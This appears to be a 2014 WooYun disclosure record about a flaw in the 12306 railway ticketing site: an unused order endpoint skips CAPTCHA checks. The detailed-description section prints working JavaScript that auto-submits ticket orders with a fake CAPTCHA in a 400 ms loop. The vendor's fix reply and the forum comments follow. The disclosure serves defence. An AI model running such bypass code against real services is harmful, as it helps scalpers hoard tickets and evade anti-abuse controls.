{"id": 5570, "wybug_id": "wooyun-2014-049555", "wybug_title": "12306订单提交逻辑设计有权限导致可以绕过验证码直接提交订单", "wybug_corp": "中国铁道科学研究院", "wybug_author": "木鱼", "wybug_date": "2014-01-22 16:05", "wybug_open_date": "2014-03-08 16:06", "wybug_type": "设计缺陷/逻辑错误", "wybug_level": "高", "wybug_rank_0": "15", "wybug_status": "厂商已经确认", "wybug_from": "http://www.wooyun.org", "wybug_tags": ["敏感接口缺乏校验", "逻辑错误"], "wybug_detail": "漏洞详情 披露状态：   \t\t\t\t\t\t\t\t\t2014-01-22：\t细节已通知厂商并且等待厂商处理中\t\t\t\t\t\t\t\t\t2014-01-29：\t厂商已经确认，细节仅向厂商公开\t\t\t\t\t\t\t\t\t2014-02-08：\t细节向核心白帽子及相关领域专家公开\t\t\t\t\t\t\t\t\t2014-02-18：\t细节向普通白帽子公开\t\t\t\t\t\t\t\t\t2014-02-28：\t细节向实习白帽子公开\t\t\t\t\t\t\t\t\t2014-03-08：\t细节向公众公开  简要描述： 12306的订单提交逻辑中，存在目前未使用的逻辑接口，且此接口对验证码没有进行任何校验，从而导致用户可以使用一定的方式绕过验证码直接提交订单，并且不需要任何排队。 详细说明：  12306的前端订单逻辑处理中，存在一个提交订单的 confirmPassenger/confirmSingle 接口。此接口目前没有在12306本身用到，但是这个接口依然可以提交订单，并且完全无需验证码。以下代码摘自网上，经测试完全有效，提交的验证码是错误（根本没有）的，但是完全被confirmSingle接口无视。\n$(\"#randCode2\").unbind('keyup');function bO() {if ($(\"#sf2\").is(\":checked\")) {return \"0X00\"} else {return \"ADULT\"}};$(\"#randCode2\").on(\"click\",   function(bR) {     $.ajax({      url: ctx+\"passcodeNew/checkRandCodeAnsyn\",      type: \"post\",      data: {       randCode: $(\"#randCode2\").val(),       rand: \"sjrand\"      },      async: false,      success: function(bS) {              bb = $(\"#randCode2\").val();        $(\"#back_edit\").trigger(\"click\");        $.ajax({          url: ctx + \"confirmPassenger/confirmSingle\",          type: \"post\",          data: {           passengerTicketStr: getpassengerTicketsForAutoSubmit(),           oldPassengerStr: getOldPassengersForAutoSubmit(),           tour_flag: \"dc\",           randCode: $(\"#randCode\").val(),           purpose_codes: bO(),           key_check_isChange: md5Str,           train_location: location_code          },          dataType: \"json\",          async: true,          success: function(bR) {             otsRedirect(\"post\", ctx + \"payOrder/init?random=\" + new Date().getTime(), {})          },          error: function(bR, bT, bS) {           return          }         })        $(\"#randCode2\").removeClass(\"inptxt w100 error\").addClass(\"inptxt w100\");        $(\"#i-ok2\").css(\"display\", \"block\");        $(\"#c_error2\").html(\"\");        $(\"#c_error2\").removeClass(\"error\");        return      }     })       bb = $(\"#randCode2\").val()});setInterval(function(){ if($('#autosubmitcheckticketinfo').css('display')!='none'){  $(\"#randCode2\").val('xxoo');$(\"#randCode2\").trigger('click'); }},400);\n   漏洞证明：  \n\n   修复方案：  鉴于此接口目前并没有用到，建议屏蔽。   版权声明：转载请注明来源 木鱼@乌云\n ", "wybug_reply": "漏洞回应  厂商回应： 危害等级：高 漏洞Rank：15  确认时间：2014-01-29 15:35 厂商回复： 当日已修复。忘记确认了。多谢！ 最新状态： 暂无  ", "replys": "漏洞评价：\n评论\n     2014-01-22 16:06 |    \t\tLeon \t\t\t( 路人 |\t\t\t        Rank:25 漏洞数:6        | 永无宁日啊)\t\t \n  速度围观 沙发在这！    \n     2014-01-22 16:08 |    \t\tLeon \t\t\t( 路人 |\t\t\t        Rank:25 漏洞数:6        | 永无宁日啊)\t\t \n  路人甲，你这么吊，铁道学院终于知道了！顺便可怜我这个回家没买到票，回公司又没买到票的人吧！求私聊    \n     2014-01-22 16:11 |    \t\t摸了你 \t\t\t( 实习白帽子  |\t\t\t        Rank:71 漏洞数:17        | 1shitMVqBjCKrnRvSoixMx6RKpG9J8pBM)\t\t \n  这个是12306插件的作者呀..    \n     2014-01-22 16:39 |    \t\t木鱼 \t\t\t( 路人 |\t\t\t        Rank:25 漏洞数:2        | 木鱼。)\t\t \n  发现有个漏洞报告类似的  WooYun: 12306漏洞提交订单不需要验证码 ，不知道是不是重复的漏洞报告。如果是相同的话，居然还没修复？    \n     2014-01-22 16:47 |    \t\tweb天空 \t\t\t( 路人 |\t\t\t        Rank:1 漏洞数:1        | 你猜镇，不告诉你村。)\t\t \n  @木鱼 木鱼为啥不整合到NET版软件里啊，我还没买到票，可怜    \n     2014-01-22 16:53 |    \t\t木鱼 \t\t\t( 路人 |\t\t\t        Rank:25 漏洞数:2        | 木鱼。)\t\t \n  @web天空 我看到缺陷和漏洞，不会利用。别人不要人品见缝就钻，我做不出来。良好的购票秩序是每个人共同来维护的。的确黄牛很多，利用这些漏洞的软件卖钱、囤票赚钱的也很多，但是这是不义之财，我不要。发现漏洞很多人都能做到，但是发现后会怎么处理，体现出一个人的人品。发现后，不是为服务方改进体验完善产品的，而是为自己谋取好处赚取利益的，人品负分滚粗。我希望每个人都能买到票，但这不代表我希望人们都以暴制暴，看到黄牛利用漏洞、用暴力手段，自己就也要用，非要跟他们玩命才觉得公平。话说回来，没买到票的话，不要气馁。除非车已经开走，否则你都有机会。除此以外，还有很多其他方式可以选择。祝你好运。    \n     2014-01-23 01:13 |    \t\tBlack Angel \t\t\t( 普通白帽子  |\t\t\t        Rank:163 漏洞数:35        | 最神奇的一群人，智慧低调又内敛，俗称马甲...)\t\t \n  @木鱼 你的软件很好用,我介绍给我几个同事,他们都抢到回家的票了.我不需要买票,但是还是很感谢你为他们付出了这么多精力,毕竟一款免费软件不好做.    \n     2014-01-23 09:09 |    \t\t齐迹 \t\t\t( 核心白帽子 |\t\t\t        Rank:784 漏洞数:100        | 一名普通的phper开发者，关注web安全。)\t\t \n  支持！@木鱼 如果黄牛知道了 正常用户就别指望买到票了！    \n     2014-01-23 09:15 |    \t\t光刃 \t\t\t( 普通白帽子  |\t\t\t        Rank:200 漏洞数:24        | 萝卜白菜保平安)\t\t \n  还是短途车好呀，买硬座票，享受卧铺的待遇。    \n     2014-01-23 11:14 |    \t\t木鱼 \t\t\t( 路人 |\t\t\t        Rank:25 漏洞数:2        | 木鱼。)\t\t \n  @齐迹 据我所知已经有部分收费软件已经在使用此漏洞了    \n     2014-01-23 14:32 |    \t\t小奥 \t\t\t( 路人 |\t\t\t        Rank:6 漏洞数:8        | 小奥，大一学生一枚，热爱IT)\t\t \n  @木鱼 谢谢大神的Chorme插件 我用它抢火车票定飞机票很久啦~~~    \n     2014-01-23 19:49 |    \t\t木鱼 \t\t\t( 路人 |\t\t\t        Rank:25 漏洞数:2        | 木鱼。)\t\t \n  目测漏洞已经被修复了，可是12306不来认领。。    \n     2014-01-24 09:08 |    \t\tLeon \t\t\t( 路人 |\t\t\t        Rank:25 漏洞数:6        | 永无宁日啊)\t\t \n  @木鱼 是不是传说中的木鱼啊？    \n     2014-01-24 15:14 |    \t\t木鱼 \t\t\t( 路人 |\t\t\t        Rank:25 漏洞数:2        | 木鱼。)\t\t \n  @Leon 是啊。。。。    \n  \n\n\n", "wybug_level_fromcorp": "高", "wybug_rank_fromcorp": 15, "Ranks": null}